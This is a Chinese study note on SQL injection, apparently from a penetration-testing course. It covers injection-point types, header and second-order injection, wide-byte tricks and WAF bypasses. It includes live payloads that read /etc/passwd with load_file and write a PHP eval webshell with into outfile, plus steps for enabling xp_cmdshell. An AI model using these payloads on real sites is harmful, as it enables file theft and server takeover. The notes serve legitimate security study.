---
type: 单元
domain: B-入口Web
status: 待实测
created: 2026-11-20
tags: [Web, SQL注入]
---

# B01 · SQL 注入

> 来源：`00-Web漏洞总览` 按单元拆出（2026-11-20），并核过小迪漏洞攻防笔记（该类重合 98%）。
> **课程对应**：小迪 D53–60（SQL 注入）。
> **判据**：参数能不能控、库有什么权限、能不能读文件或执行命令。
> 本节只管"怎么把注入变成可复现结论"；提权与体量边界在 [[Security/D-提权上线维持/D03-数据库权限与体量边界|D03]]。

## 一、注入点判定

条件：变量可控（有注入点）、能绕过且能带入数据库查询

判断数据库类型、权限，明确提交方法、参数类型

### 数据库类型

**mysql**、mssql、<u>mongoDB</u>（列表形式传参）、<u>oracle</u>、PostgreSQL

四类库的语法差异（判库型后直接查这一张表）：

| 功能 | MySQL | Oracle | SQL Server | PostgreSQL |
|---|---|---|---|---|
| 注释 | `-- ` 或 `#` | `--` | `--` | `--` |
| 当前用户 | `user()` | `user` | `current_user` | `current_user` |
| 版本 | `@@version` | `banner FROM v$version` | `@@version` | `version()` |
| 系统表 | `information_schema` | `all_tables` | `sysobjects` | `pg_tables` |
| 延时 | `SLEEP(2)` | `DBMS_PIPE.RECEIVE_MESSAGE` | `WAITFOR DELAY` | `pg_sleep(2)` |
| 读文件 | `LOAD_FILE()` | 需 PL/SQL 扩展 | `BULK INSERT` | `pg_read_file()` |
| 命令执行 | 需 `FILE` 权限写 WebShell | `DBMS_SCHEDULER` | `xp_cmdshell` | 需扩展（如 `COPY TO`） |

Access（**单库**，暴力破解（借助字典猜解表名和列名），偏移注入：解决表名已知列名未知的情况，可通过url或者源代码的表单值猜表名）

数据库A=网站A=数据库用户A

**Mysql**5.0版本以上存在自带数据库名information_schema（储存所有数据库名、表名、列名）

**Mysql**5.0以下版本可用sqlmap爆破或者文件读取

操作系统       @@version_compile_os

数据库名       database（）    table_schema        schemata

数据库用户    user（）

数据库版本    version （）

其它（路径）

schemata表有schema_name字段，tables有table_schema和table_name字段，columns表有table_schema,table_name和column_name

### 提交方法

**GET**

**POST**

COOKIE

REQUEST（接受全部）

HTTP头(请求头内注入)

$s = **$_SERVER**['HTTP_USER_AGENT'];

### 数据类型

判断是否有干扰符号

数字型

字符型（默认单引号闭合）

搜索型

**JSON**（类python列表的数据存储格式）

{

user：''小弟"，

passwd："xiaodi"

}    JSON自带引号（前端）无需考虑闭合，只需关注注入数据库的语句是否需要闭合

### 查询方式

select

insert（网站用户注册等）

delete

update

order by

模糊查询：like **‘%** xiaodi8 **%'**

跨库查询：更高权限用户查询其他库，查询时要指定数据库的指定数据如qqyw.admin

#### 文件读写

getshell:

```sql
MySQL GETSHELL条件和原理：
条件：
 root权限
 知道网站根目录绝对路径
 secure_file_priv为空或指定目录（@@secure_file_priv参数可以其值）
 gpc关闭
原理：
 写入webshell，通过参数执行系统命令，结束后删除webshell
```

```sql
sqlserver getshell条件和原理
 条件：
  支持外连
  有sa权限
 原理：
  开启xp_cmd扩展执行系统命令
```

**检验**：show variables like '%secure%'

**load_file**：**读取**函数  如?id=-1 union select 1,load_file('C:\ \phpstudy_pro\ \WWW\ \sqli-labs\ \ \sql-connections\ \db-creds.inc'),3 --+

```sql
?id=-1'union select load_file('/etc/passwd'),2%23
```

**into outfile**   或者      **into dumpfile**：**写入**函数    如?id=-1 union select 1,'x',3 into outfile 'C:\\phpstudy_pro\\WWW\\sqli-labs\\x.php'--+

```sql
?id=-1' union select '<?php eval($_POST[1]);?>',2 into outfile '/var/www/html/shell.php'%23
```

使用路径时用       **双斜杠** \\      防转义       或者编码后使用来绕过魔术引号

select 1,2 into outfile “/var/www/html/1.txt”
into outfile 将select的结果写入到指定目录的1.txt中
在一些没有回显的注入中可以使用into outfile将结果写入到指定文件，然后访问获取
前提条件:
1.需要知道远程目录
2.需要远程目录有写权限
3.需要数据库开启了secure_ file_ priv
字符型注入：
获取操作系统权限：

```bash
1' union select "<?php @eval($_GET['test'])?>",2 into outfile "/val/www/html/1.php" #
```



##### 路径获取

报错显示

遗留文件

漏洞报错

平台配置文件

爆破

#### 回显/盲注

##### DNSlog注入

### 报头注入

注入点的不同是由源码中带入sql查询的参数的获取方式决定的

#### uagent注入

POST注入时对表单内容进行了过滤

$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('**$uagent**', '$IP', $uname)";

在插入数据语句处进行注入，因为是路径注入所以采用**报错注入**

一般配合表单提交，可能要登录成功才能继续注入

#### refer

基本原理同上，注入过程也大同小异，也就是注入头不一样

#### cookie

setcookie（name，value，expire）函数

将cookie数据带入表中查询

反正就是在cookie中注入

XFF

### 注入拓展

##### 加解密注入

源码中有解码过程，所以要对注入语句先**编码**（base64、json）

1.判断参数是否加密

2.判断何种加密

中转注入

自动化脚本将sql语句编码后自动拼接

脚本请求远程数据包，自定义后进行自动化注入

##### 二次注入

**原理**：在网站一些可写入参数的地方进行sql注入语句时有过滤，但是在注入语句保存在数据库后是正常的，所以要调用（主动/被动调用，比如数据库将注入的语句**更新**）没有过滤的功能模块查询/修改存储的注入语句，导致sql语句被带入查询语句造成sql注入。

例题：[网鼎杯2018]Unfinish

绕过转义/魔术引号：

插入新数据会过滤：insert 1 union select \ '

但是在数据库中会还原：union select '

故数据库更新数据后注入的语句起效  update 1 union select '

1.插入恶意数据

2.引用恶意数据

如在注册用户或修改用户信息时用sql语句插入或更新数据库信息导致信息泄露

##### DNSlog注入

通过写入命令（load_file）让数据库访问有DNS解析的指定站点获得数据（将注入语句与DNS地址拼接），比较鸡肋，既然可以写入shell了何必再绕去做DNS解析

##### 堆叠注入

用分号隔开多个sql语句进行注入，前提是数据库支持，且底层代码能带入查询

##### 宽字节注入

addslashes()

通过编码绕过后端代码的防御措施，列如正则过滤和转义函数转义。

客户端采用GBK编码格式，数据库对用户输入进行转义`\` ，转移符`\`的编码为%5c，添加编码%df,组成%df%5c，此时编码表达为繁体字連，从而绕过转义符让` ' `逃逸。

##### 无列名注入

```sql
select `3` from (select 1,2,3 union select * from admin)a;
```

就是利用给列名起别名，然后进行多表联合查询

#### WAF绕过

##### 逗号绕过

join

union select 1,2,3

**union select * from (select 1) a join (select 2) b join (select 3) c**(内联查询)



大小写

加密/解密

编码/解码

##### 等价函数

?id = 1         ==         ?id = 2-1         ==        ?id = 1^1^1

##### 特殊符号

union --+b %0a select (与下面的原理差不多，当两字符不能同时出现时，可在中间加上其它能被waf识别但不能被数据库识别的字符进行过滤)

%0a用于换行避免select 也被过滤

##### 注释符混用

WAF可识别，但数据库不可

/*    字符    */       其中字符在数据库中被注释

/* !   字符     * /     其中字符任可被数据库识别

替换：/*!50001 select * from * test */   50001  mysql 版本号     超过该版本号的字符才能识别

##### 方式

更改提交方式

变异

##### 其它

##### 参数污染

WAF防护与数据库环境获取参数的方式不同，导致在WAF中判定不会执行的sql语句却能在数据库中正常拼接执行

如?id=1/* *&id=-1%20union%20select%201,2,3%23 */

##### Fuzz

脚本爆破测试

##### 数据库特性

1.对访问对象的监控

sqlmap 配合 burp抓包进行注入，如修改agent

2.对流量的限制

sqlmap延时注入

抓代理

##### 垃圾数据溢出

进行大量垃圾数据填充，在WAF检测到之前完成注入。或是超出WAF的检测范围   

#### 防御方案

魔术引号（宽字节注入）

内置函数：is_int()

自定义关键字：str_replace()

### Tamper利用

人工测试判断过滤，然后使用tamper加载插件通过sqlmap注入
